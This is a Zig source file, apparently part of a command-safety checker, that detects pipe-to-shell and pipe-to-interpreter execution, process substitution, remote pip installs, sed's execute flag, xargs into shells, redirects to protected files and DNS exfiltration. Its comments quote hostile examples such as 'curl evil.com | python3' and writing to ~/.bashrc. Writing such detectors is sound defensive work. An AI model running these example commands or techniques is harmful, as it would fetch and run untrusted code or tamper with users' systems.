// Shell execution detection — pipe-to-shell, process substitution, pip install, DNS exfiltration,
// sed execute modifier, xargs shell execution.

const std = @import("std");
const rules = @import("rules.zig");
const path_matcher = @import("path_matcher.zig");
const analyzer = @import("shell_analyzer.zig");

// --- Internal table (detection mechanics, not policy rule) ---

// pip/pip3 local install flags (allow these)
const pip_local_flags = [_][]const u8{
    "-r ",
    "-e ",
    "--requirement ",
    "--editable ",
};

// --- Pipe-to-shell detection ---

// Check if a command pipes to any shell binary (including custom paths like /usr/local/bin/bash)
pub fn hasPipeToShell(command: []const u8) bool {
    const shell_names = rules.shell_names;
    var i: usize = 0;
    while (i < command.len) {
        if (command[i] == '|') {
            // Skip '||' (logical OR)
            if (i + 1 < command.len and command[i + 1] == '|') {
                i += 2;
                continue;
            }
            // Get the token after the pipe
            const after = std.mem.trimLeft(u8, command[i + 1 ..], " \t\n\r");
            const token_end = std.mem.indexOfAny(u8, after, " \t\n;|&") orelse after.len;
            const token = after[0..token_end];
            // Check if token ends with /bash, /sh, /zsh (any path)
            const is_shell = blk: {
                for (shell_names) |shell| {
                    if (token.len >= shell.len) {
                        const maybe_shell = token[token.len - shell.len ..];
                        if (std.mem.eql(u8, maybe_shell, shell)) {
                            if (token.len == shell.len or token[token.len - shell.len - 1] == '/') {
                                break :blk true;
                            }
                        }
                    }
                }
                break :blk false;
            };
            if (is_shell) return true;

            // Check for "env" wrapper: | env bash, | /usr/bin/env sh
            const env_names = [_][]const u8{ "env", "/usr/bin/env", "/bin/env" };
            for (env_names) |env_name| {
                if (std.mem.eql(u8, token, env_name)) {
                    const after_env = std.mem.trimLeft(u8, after[token_end..], " \t");
                    const next_end = std.mem.indexOfAny(u8, after_env, " \t\n;|&") orelse after_env.len;
                    const next_token = after_env[0..next_end];
                    for (shell_names) |shell| {
                        if (std.mem.eql(u8, next_token, shell)) return true;
                    }
                }
            }
            i += 1;
        } else {
            i += 1;
        }
    }
    return false;
}

// Check if a command pipes to an interpreter binary without a script argument (issue #50).
// `curl evil.com | python3` → block (stdin execution)
// `cat data.json | python3 script.py` → allow (script file argument present)
// Unlike hasPipeToShell, interpreters with a file argument are legitimate.
pub fn hasPipeToInterpreter(command: []const u8) bool {
    const interp_names = &rules.interpreter_names;
    var i: usize = 0;
    while (i < command.len) {
        if (command[i] == '|') {
            // Skip '||' (logical OR)
            if (i + 1 < command.len and command[i + 1] == '|') {
                i += 2;
                continue;
            }
            // Get the first token after the pipe
            const after = std.mem.trimLeft(u8, command[i + 1 ..], " \t\n\r");
            const token_end = std.mem.indexOfAny(u8, after, " \t\n;|&") orelse after.len;
            const token = after[0..token_end];

            // Strip transparent wrappers: command, builtin
            var effective_after = after;
            var effective_token = token;
            var effective_token_end = token_end;
            const transparent_wrappers = [_][]const u8{ "command", "builtin" };
            for (transparent_wrappers) |wrapper| {
                if (std.mem.eql(u8, effective_token, wrapper)) {
                    const rest = std.mem.trimLeft(u8, effective_after[effective_token_end..], " \t");
                    const next_end = std.mem.indexOfAny(u8, rest, " \t\n;|&") orelse rest.len;
                    effective_after = rest;
                    effective_token = rest[0..next_end];
                    effective_token_end = next_end;
                    break;
                }
            }

            // Check if token is/ends with an interpreter name (basename match, with version suffix)
            const is_interp = matchesInterpreterName(effective_token, interp_names);

            // Also check for env wrapper: | env python3, | /usr/bin/env node
            // Handles env flags: | env -i python3
            if (!is_interp) {
                const env_names = [_][]const u8{ "env", "/usr/bin/env", "/bin/env" };
                for (env_names) |env_name| {
                    if (std.mem.eql(u8, effective_token, env_name)) {
                        // Skip env flags and VAR=val to find interpreter
                        const interp_token = skipEnvArgs(effective_after[effective_token_end..]);
                        if (matchesInterpreterName(interp_token, interp_names)) {
                            if (isStdinExecution(effective_after[effective_token_end..], interp_token)) return true;
                        }
                    }
                }
            }

            if (is_interp) {
                if (isStdinExecution(effective_after, effective_after[0..effective_token_end])) return true;
            }
            i += 1;
        } else {
            i += 1;
        }
    }
    return false;
}

// Stdin execution pseudo-paths that should be treated like no-argument
const stdin_paths = [_][]const u8{ "-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0" };

// Flags that take a code argument (interpreter executes the flag's value, not stdin)
const code_exec_flags = [_][]const u8{ "-c", "-e", "-m" };

// Script file extensions — if a non-flag argument has one of these, it's a script file.
const script_extensions = [_][]const u8{ ".py", ".js", ".ts", ".rb", ".pl", ".php", ".sh", ".mjs", ".cjs", ".tsx", ".jsx" };

// Check if an interpreter invocation reads from stdin (no script file argument).
fn isStdinExecution(after_pipe: []const u8, interp_token: []const u8) bool {
    // Find where the interpreter token ends in after_pipe
    const interp_start = std.mem.indexOf(u8, after_pipe, interp_token) orelse return false;
    const after_interp = std.mem.trimLeft(u8, after_pipe[interp_start + interp_token.len ..], " \t");
    // Skip flags (but detect code-exec flags that mean "not stdin")
    var rest = after_interp;
    while (rest.len > 0) {
        // Include > and < in separators to handle redirect syntax (2>/dev/null)
        const arg_end = std.mem.indexOfAny(u8, rest, " \t\n;|&><") orelse rest.len;
        const arg = rest[0..arg_end];
        if (arg.len == 0) break;
        // Check for stdin pseudo-paths
        for (stdin_paths) |sp| {
            if (std.mem.eql(u8, arg, sp)) return true; // explicit stdin → block
        }
        if (arg[0] != '-') {
            // Non-flag argument: check if it looks like a script file
            if (looksLikeScriptFile(arg)) return false; // script file → allow
            // Not a recognizable script file — could be a flag argument (e.g. "ignore" after -W)
            // Skip and keep checking for actual script files
            rest = std.mem.trimLeft(u8, rest[arg_end..], " \t");
            // Also skip redirect syntax
            if (rest.len > 0 and (rest[0] == '>' or rest[0] == '<')) break;
            continue;
        }
        // It's a flag. Check if it's a code-exec flag → not stdin execution
        for (code_exec_flags) |cf| {
            if (std.mem.eql(u8, arg, cf) or std.mem.startsWith(u8, arg, cf)) return false;
        }
        // Non-code flag (e.g. -u, -W, -B) — skip and keep checking
        rest = std.mem.trimLeft(u8, rest[arg_end..], " \t");
    }
    // No script file argument found → stdin execution
    return true;
}

// Check if a token looks like a script file (has a known extension)
fn looksLikeScriptFile(arg: []const u8) bool {
    // Check for known script extensions (covers ./script.py, /path/to/script.py, script.py)
    for (script_extensions) |ext| {
        if (std.mem.endsWith(u8, arg, ext)) return true;
    }
    return false;
}

// Skip env flags (-i, -u VAR, -S, etc.) and VAR=val assignments to find the command token
fn skipEnvArgs(after_env_token: []const u8) []const u8 {
    var rest = std.mem.trimLeft(u8, after_env_token, " \t");
    // Note: -S/--split-string is NOT listed here because its argument IS the command to execute
    const flags_with_arg = [_][]const u8{ "-u", "--unset", "-C", "--chdir" };
    while (rest.len > 0) {
        const tok_end = std.mem.indexOfAny(u8, rest, " \t\n;|&") orelse rest.len;
        const tok = rest[0..tok_end];
        if (tok.len == 0) break;
        if (tok[0] == '-') {
            // Handle --split-string=CMD / -SCMD: extract the command part after = or -S
            if (std.mem.startsWith(u8, tok, "--split-string=")) {
                const cmd = tok["--split-string=".len..];
                if (cmd.len > 0) return cmd;
                rest = std.mem.trimLeft(u8, rest[tok_end..], " \t");
                continue;
            }
            if (tok.len > 2 and std.mem.startsWith(u8, tok, "-S")) {
                const cmd = tok[2..];
                if (cmd.len > 0) return cmd;
            }
            // Check if flag takes an argument
            var takes_arg = false;
            for (flags_with_arg) |fa| {
                if (std.mem.eql(u8, tok, fa)) {
                    takes_arg = true;
                    break;
                }
            }
            rest = std.mem.trimLeft(u8, rest[tok_end..], " \t");
            if (takes_arg and rest.len > 0) {
                const arg_end = std.mem.indexOfAny(u8, rest, " \t") orelse rest.len;
                rest = std.mem.trimLeft(u8, rest[arg_end..], " \t");
            }
        } else if (std.mem.indexOf(u8, tok, "=")) |eq_idx| {
            const sp_idx = std.mem.indexOfAny(u8, tok, " \t") orelse tok.len;
            if (eq_idx < sp_idx) {
                // VAR=val assignment — skip
                rest = std.mem.trimLeft(u8, rest[tok_end..], " \t");
            } else {
                return tok; // not an assignment, this is the command
            }
        } else {
            return tok; // found the command token
        }
    }
    return "";
}

// Check if command uses process substitution to execute an interpreter: python3 <(...) (issue #50)
pub fn hasProcessSubstitutionInterpreter(command: []const u8) bool {
    const interp_names = &rules.interpreter_names;
    var i: usize = 0;
    while (std.mem.indexOfPos(u8, command, i, "<(")) |idx| {
        if (idx == 0) {
            i = idx + 2;
            continue;
        }
        var end = idx;
        while (end > 0 and command[end - 1] == ' ') end -= 1;
        if (end == 0) {
            i = idx + 2;
            continue;
        }
        var start = end;
        while (start > 0 and !std.ascii.isWhitespace(command[start - 1]) and command[start - 1] != ';' and command[start - 1] != '|' and command[start - 1] != '&' and command[start - 1] != '(' and command[start - 1] != ')') start -= 1;
        const token = command[start..end];
        if (matchesInterpreterName(token, interp_names)) return true;
        i = idx + 2;
    }
    return false;
}

// Check if a token matches an interpreter name, including versioned variants.
// Matches: python3, /usr/bin/python3, python3.11, /usr/local/bin/python3.12
// The basename must start with a known interpreter name, optionally followed by
// a version suffix (dot + digits, e.g. ".11", ".12.1").
fn matchesInterpreterName(token: []const u8, names: []const []const u8) bool {
    const base = path_matcher.basename(token);
    for (names) |name| {
        if (std.mem.eql(u8, base, name)) return true;
        // Check for version suffix: name + "." + digits (e.g. python3.11)
        if (base.len > name.len and std.mem.startsWith(u8, base, name) and base[name.len] == '.') {
            // Verify the rest is digits and dots (version number)
            const suffix = base[name.len + 1 ..];
            var all_version = suffix.len > 0;
            for (suffix) |c| {
                if (!std.ascii.isDigit(c) and c != '.') {
                    all_version = false;
                    break;
                }
            }
            if (all_version) return true;
        }
    }
    return false;
}

// Check if command uses process substitution to execute a shell: bash <(...), sh <(...), . <(...)
// Note: "source <(...)" is caught by prefix_only_commands via matchesPrefixInChain, not here.
pub fn hasProcessSubstitutionShell(command: []const u8) bool {
    const shell_names = rules.shell_names;
    var i: usize = 0;
    while (std.mem.indexOfPos(u8, command, i, "<(")) |idx| {
        if (idx == 0) {
            i = idx + 2;
            continue;
        }
        var end = idx;
        while (end > 0 and command[end - 1] == ' ') end -= 1;
        if (end == 0) {
            i = idx + 2;
            continue;
        }
        var start = end;
        while (start > 0 and !std.ascii.isWhitespace(command[start - 1]) and command[start - 1] != ';' and command[start - 1] != '|' and command[start - 1] != '&' and command[start - 1] != '(' and command[start - 1] != ')') start -= 1;
        const token = command[start..end];
        const base = path_matcher.basename(token);
        for (shell_names) |shell| {
            if (std.mem.eql(u8, base, shell)) return true;
        }
        // Also check for ". <(" (dot-source)
        if (std.mem.eql(u8, token, ".")) return true;
        i = idx + 2;
    }
    return false;
}

// --- Output process substitution detection ---

// Detect >(shell) patterns: tee >(bash), cmd >(sh -c 'evil'), etc.
// Unlike <() where the shell is BEFORE the substitution (bash <(...)),
// for >() the shell is INSIDE the substitution (>(bash ...)).
pub fn hasOutputProcessSubstitutionShell(command: []const u8) bool {
    const shell_names = rules.shell_names;
    var i: usize = 0;
    while (std.mem.indexOfPos(u8, command, i, ">(")) |idx| {
        const after = command[idx + 2 ..];
        // Extract first token inside >(...)
        const trimmed = std.mem.trimLeft(u8, after, " \t");
        const token_end = std.mem.indexOfAny(u8, trimmed, " \t)") orelse trimmed.len;
        if (token_end > 0) {
            const token = trimmed[0..token_end];
            const base = path_matcher.basename(token);
            for (shell_names) |shell| {
                if (std.mem.eql(u8, base, shell)) return true;
            }
        }
        i = idx + 2;
    }
    return false;
}

// --- Pip install detection ---

pub fn isPipLocalInstall(command: []const u8) bool {
    // Check ALL occurrences of pip install. If any lacks a local flag or has extra
    // package names after the flag argument, return false.
    const prefixes = [_][]const u8{ "pip install ", "pip3 install " };
    var found_any = false;
    for (prefixes) |prefix| {
        var offset: usize = 0;
        while (offset < command.len) {
            if (std.mem.indexOfPos(u8, command, offset, prefix)) |idx| {
                found_any = true;
                const after = command[idx + prefix.len ..];
                if (!isLocalOnlyArgs(after)) return false;
                offset = idx + prefix.len;
            } else break;
        }
    }
    return found_any;
}

// Check that pip install arguments contain only local flags (-r file, -e path)
// and pip option flags (--flag), with no bare package names.
fn isLocalOnlyArgs(args: []const u8) bool {
    var has_local_flag = false;
    var i: usize = 0;
    while (i < args.len) {
        // Skip whitespace
        while (i < args.len and args[i] == ' ') i += 1;
        if (i >= args.len) break;

        // Stop at chain separators
        if (args[i] == '&' or args[i] == '|' or args[i] == ';') break;

        if (args[i] == '-') {
            // Check for local flags that take an argument
            for (pip_local_flags) |flag| {
                if (std.mem.startsWith(u8, args[i..], flag)) {
                    has_local_flag = true;
                    i += flag.len;
                    // Skip the flag's argument (the file/path)
                    while (i < args.len and args[i] != ' ' and args[i] != '&' and args[i] != '|' and args[i] != ';') i += 1;
                    break;
                }
            } else {
                // Other flag (--no-cache-dir, --quiet, etc.) — skip it
                while (i < args.len and args[i] != ' ' and args[i] != '&' and args[i] != '|' and args[i] != ';') i += 1;
            }
        } else {
            // Bare word that is not a flag — this is a package name
            return false;
        }
    }
    return has_local_flag;
}

// --- sed execute modifier detection ---

// Detect sed 's/X/Y/e' where /e executes the replacement as a shell command.
// After normalization, quotes are stripped so we see: sed s/X/Y/e
// We scan the full command directly (not via chainSegments) because sed's alternate
// delimiter can be '|' which would be split as a pipe by the chain iterator.
pub fn hasSedExecFlag(command: []const u8) bool {
    var offset: usize = 0;
    while (offset < command.len) {
        if (std.mem.indexOfPos(u8, command, offset, "sed ")) |idx| {
            // Word boundary check: must be at start or preceded by non-alnum
            const before_ok = idx == 0 or !std.ascii.isAlphanumeric(command[idx - 1]);
            if (before_ok) {
                if (scanSedSubstitutionE(command[idx + 4 ..])) return true;
            }
            offset = idx + 4;
        } else break;
    }
    return false;
}

// Scan sed arguments for a substitution command with the 'e' flag.
// After normalization: sed s/X/Y/e, sed -e s/X/Y/e, sed s|X|Y|ge
fn scanSedSubstitutionE(args: []const u8) bool {
    var i: usize = 0;
    while (i < args.len) {
        // Skip whitespace
        while (i < args.len and (args[i] == ' ' or args[i] == '\t')) i += 1;
        if (i >= args.len) break;

        // Stop at chain separators (but NOT | — it could be sed delimiter)
        if (args[i] == '&' or args[i] == ';') break;

        // Look for 's' followed by a non-alphanumeric, non-space delimiter
        if (args[i] == 's' and i + 1 < args.len and !std.ascii.isAlphanumeric(args[i + 1]) and args[i + 1] != ' ' and args[i + 1] != '\t') {
            const delim = args[i + 1];
            // Count 3 occurrences of delimiter: s<d>pattern<d>replacement<d>flags
            var pos = i + 2;
            var delim_count: usize = 1; // first delimiter already found
            while (pos < args.len and delim_count < 3) {
                if (args[pos] == '\\' and pos + 1 < args.len) {
                    pos += 2; // skip escaped char
                    continue;
                }
                if (args[pos] == delim) delim_count += 1;
                pos += 1;
            }
            if (delim_count == 3) {
                // pos is now right after the 3rd delimiter; scan flags
                while (pos < args.len and args[pos] != ' ' and args[pos] != '\t' and args[pos] != ';' and args[pos] != '&') {
                    if (args[pos] == 'e') return true;
                    pos += 1;
                }
            }
        }
        // Skip to next whitespace-separated token
        while (i < args.len and args[i] != ' ' and args[i] != '\t') i += 1;
    }
    return false;
}

// --- xargs shell execution detection ---

// Detect xargs piping to a shell binary: xargs bash, xargs sh, xargs -I{} bash, etc.
// We scan the full command directly (not via chainSegments) because xargs uses {}
// which would be split by the chain iterator on '{'.
pub fn hasXargsShell(command: []const u8) bool {
    const shell_names = rules.shell_names;
    var offset: usize = 0;
    while (offset < command.len) {
        if (std.mem.indexOfPos(u8, command, offset, "xargs ")) |idx| {
            // Word boundary check
            const before_ok = idx == 0 or !std.ascii.isAlphanumeric(command[idx - 1]);
            if (!before_ok) {
                offset = idx + 6;
                continue;
            }
            // Find the end of this xargs segment (up to &&, ||, ;, or |)
            const rest = command[idx + 6 ..];
            const seg_end = findSegmentEnd(rest);
            const segment = rest[0..seg_end];
            // Check if any shell name appears as a word in this segment
            for (shell_names) |shell| {
                var soff: usize = 0;
                while (soff < segment.len) {
                    if (std.mem.indexOfPos(u8, segment, soff, shell)) |sidx| {
                        const sb_ok = sidx == 0 or !std.ascii.isAlphanumeric(segment[sidx - 1]);
                        const send = sidx + shell.len;
                        const sa_ok = send >= segment.len or !std.ascii.isAlphanumeric(segment[send]);
                        if (sb_ok and sa_ok) return true;
                        soff = sidx + 1;
                    } else break;
                }
            }
            offset = idx + 6 + seg_end;
        } else break;
    }
    return false;
}

// Find the end of a command segment (stopping at &&, ||, ;, but NOT |{} which may be xargs/sed)
fn findSegmentEnd(s: []const u8) usize {
    var i: usize = 0;
    while (i < s.len) {
        if (s[i] == ';') return i;
        if (s[i] == '&' and i + 1 < s.len and s[i + 1] == '&') return i;
        if (s[i] == '|' and i + 1 < s.len and s[i + 1] == '|') return i;
        // Single | is a pipe — end segment for xargs
        if (s[i] == '|' and (i + 1 >= s.len or s[i + 1] != '|')) return i;
        i += 1;
    }
    return s.len;
}

// --- Shell script execution detection ---

// Detect shell binary executing a script file: bash /tmp/script.sh, sh ./evil.sh
// Allows: bash -c '...', bash --version, bash (no args)
// Uses ChainIterator to check each segment independently.
pub fn hasShellScriptExec(command: []const u8) bool {
    const shell_names = rules.shell_names;
    var iter = analyzer.ChainIterator{
        .remaining = command,
        .separators = &analyzer.chain_separators,
    };
    while (iter.next()) |segment| {
        const trimmed = std.mem.trimLeft(u8, segment, " \t\n\r");
        // Strip shell prefix (command, builtin, VAR=val)
        const stripped = analyzer.stripShellPrefix(trimmed);
        // Check if segment starts with a shell name
        for (shell_names) |shell| {
            if (std.mem.startsWith(u8, stripped, shell)) {
                // Must be followed by a space
                if (stripped.len > shell.len and stripped[shell.len] == ' ') {
                    const after_shell = std.mem.trimLeft(u8, stripped[shell.len + 1 ..], " \t");
                    if (after_shell.len == 0) continue;
                    // If next token starts with '-' it's a flag (bash -c, bash --version) — allow
                    if (after_shell[0] == '-') continue;
                    // Otherwise it's a file path — block
                    return true;
                }
            }
        }
    }
    return false;
}

// --- Redirect target extraction ---

// Check if a command contains a redirect (> or >>) to a path that matches any of the given patterns.
// This enables detecting `echo "evil" > ~/.bashrc` even though echo is a safe_arg_command.
pub fn hasRedirectToPattern(command: []const u8, patterns: []const []const u8) bool {
    var i: usize = 0;
    while (i < command.len) {
        if (command[i] == '>') {
            // Skip >> (append) — still a redirect
            var redir_end = i + 1;
            if (redir_end < command.len and command[redir_end] == '>') redir_end += 1;
            // Skip whitespace after >
            const after = std.mem.trimLeft(u8, command[redir_end..], " \t");
            // Extract the target path token
            const token_end = std.mem.indexOfAny(u8, after, " \t\n;|&") orelse after.len;
            if (token_end > 0) {
                const target = after[0..token_end];
                for (patterns) |pattern| {
                    if (std.mem.indexOf(u8, target, pattern) != null) return true;
                    // Also match relative paths: pattern "/.foo" should match target ".foo"
                    if (pattern.len > 0 and pattern[0] == '/') {
                        if (std.mem.indexOf(u8, target, pattern[1..]) != null) return true;
                    }
                }
            }
            i = redir_end;
        } else {
            i += 1;
        }
    }
    return false;
}

// Check if a command contains a redirect to a system path (startsWith check).
pub fn hasRedirectToSystemPath(command: []const u8, prefixes: []const []const u8) bool {
    var i: usize = 0;
    while (i < command.len) {
        if (command[i] == '>') {
            var redir_end = i + 1;
            if (redir_end < command.len and command[redir_end] == '>') redir_end += 1;
            const after = std.mem.trimLeft(u8, command[redir_end..], " \t");
            const token_end = std.mem.indexOfAny(u8, after, " \t\n;|&") orelse after.len;
            if (token_end > 0) {
                const target = after[0..token_end];
                for (prefixes) |prefix| {
                    if (std.mem.startsWith(u8, target, prefix)) return true;
                }
            }
            i = redir_end;
        } else {
            i += 1;
        }
    }
    return false;
}

// --- DNS exfiltration detection ---

// Check if a DNS command (nslookup/dig) appears as a standalone word in the command
pub fn containsDnsCommand(command: []const u8) bool {
    for (rules.dns_exfil_commands) |dns_cmd| {
        var offset: usize = 0;
        while (offset < command.len) {
            if (std.mem.indexOfPos(u8, command, offset, dns_cmd)) |idx| {
                const before_ok = idx == 0 or !std.ascii.isAlphanumeric(command[idx - 1]);
                const end = idx + dns_cmd.len;
                const after_ok = end >= command.len or (!std.ascii.isAlphanumeric(command[end]) and command[end] != '_');
                if (before_ok and after_ok) return true;
                offset = idx + 1;
            } else break;
        }
    }
    return false;
}
